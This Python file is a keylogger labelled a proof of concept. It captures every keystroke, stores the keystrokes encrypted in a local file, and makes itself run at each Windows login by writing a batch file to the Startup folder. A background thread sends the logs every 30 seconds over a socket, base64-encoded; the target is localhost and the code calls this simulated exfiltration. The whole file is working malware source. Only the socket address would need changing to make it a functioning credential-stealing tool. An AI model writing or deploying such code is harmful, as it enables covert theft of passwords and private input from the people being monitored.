import os
import sys
import base64
import socket
import threading
import time

from datetime import datetime
from cryptography.fernet import Fernet

from pynput import keyboard

# 🔐 Encryption setup
KEY = Fernet.generate_key()
KEY_FILE = "key.key"

# Load or create the key
if os.path.exists(KEY_FILE):
    with open(KEY_FILE, "rb") as f:
        KEY = f.read()
else:
    KEY = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(KEY)

cipher = Fernet(KEY)


# 📝 File to store logs (encrypted)
LOG_FILE = "keylogs.enc"

# 💣 Kill switch
KILL_SWITCH = "esc"  # Press Escape to stop the logger

# 🖊️ Log buffer
log_buffer = []

# 🕰️ Timestamped logging
def log_keystroke(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        else:
            return f"[{key.name}]"
    except AttributeError:
        return f"[{key}]"

# 📂 Write encrypted logs
def write_encrypted_logs():
    if not log_buffer:
        return
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    raw_data = f"{timestamp} - {''.join(log_buffer)}\n"
    encrypted_data = cipher.encrypt(raw_data.encode())
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_data + b"\n")
    log_buffer.clear()

# 📤 Simulate exfiltration to localhost
def simulate_exfiltration():
    if not os.path.exists(LOG_FILE):
        return
    with open(LOG_FILE, "rb") as f:
        lines = f.readlines()
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(("127.0.0.1", 9001))
            for line in lines:
                s.sendall(base64.b64encode(line) + b"\n")
    except ConnectionRefusedError:
        print("⚠️ Simulated server not running on port 9001.")

# ⌨️ Listener callback
def on_press(key):
    if hasattr(key, 'name') and key.name == KILL_SWITCH:
        write_encrypted_logs()
        print("🛑 Kill switch activated.")
        return False
    keystroke = log_keystroke(key)
    log_buffer.append(keystroke)
    if len(log_buffer) >= 10:
        write_encrypted_logs()

# 🚀 Startup Persistence (for Windows - PoC only)
def add_to_startup():
    if sys.platform.startswith('win'):
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        target_file = os.path.join(startup_path, 'keylogger_poc.bat')
        script_path = os.path.abspath(__file__)
        with open(target_file, 'w') as f:
            f.write(f'@echo off\npython "{script_path}"\n')

# 🔁 Background thread for exfiltration
def start_exfiltration_thread():
    def run():
        while True:
            simulate_exfiltration()
            time.sleep(30)  # simulate every 30 seconds
    threading.Thread(target=run, daemon=True).start()

# 🚦 Start keylogger
def start_keylogger():
    add_to_startup()
    start_exfiltration_thread()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    print("🟢 Keylogger PoC started. Press ESC to stop.")
    start_keylogger()
